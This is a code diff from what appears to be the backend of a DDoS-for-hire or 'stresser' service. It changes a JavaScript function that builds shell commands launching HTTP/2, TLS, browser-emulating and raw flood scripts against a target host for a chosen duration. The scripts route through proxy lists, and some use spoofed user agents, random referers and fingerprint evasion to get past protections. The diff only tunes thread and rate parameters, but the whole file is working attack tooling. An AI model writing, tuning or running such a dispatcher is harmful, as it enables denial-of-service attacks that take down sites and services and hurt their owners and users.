@@ -23,11 +23,11 @@ const activeProcesses = new Map();
 const generateCommand = (method, host, port, time) => {
     switch (method) {
         case 'H2FLASH':
-            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 2 proxy.txt`;
+            return `cd /root/methods && node H2-FLASH.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2FLOOD':
             return `cd /root/methods && node H2-FLOOD.js ${host} ${time} 64 4 proxy.txt`;
         case 'CATMIA':
-            return `cd /root/methods && node Vzy.js ${host} ${time} 64 4 proxy.txt`;
+            return `cd /root/methods && node Vzy.js ${host} ${time} 32 4 proxy.txt`;
         case 'MIAMIX':
             return `cd /root/methods && node MIXMAX.js ${host} ${time} 8 4 proxy.txt`;
         case 'TLS':
@@ -35,13 +35,13 @@ const generateCommand = (method, host, port, time) => {
         case 'BROWSER':
             return `cd /root/methods && screen -dm node browsern.js ${host} ${time} 8 --fingerprint advanced`;
         case 'H2NEYLI':
-            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 10 proxy.txt`;
+            return `cd /root/methods && node H2-NEYLI.js ${host} ${time} 32 4 proxy.txt`;
         case 'MIXBIL':
             return `cd /root/methods && node MIXBIL.js ${host} ${time} 32 4 proxy.txt`;
         case 'RAW':
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
-            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
+            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 4 proxy.txt`;
         case 'H2MERIS':
             return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'TCPSSH':
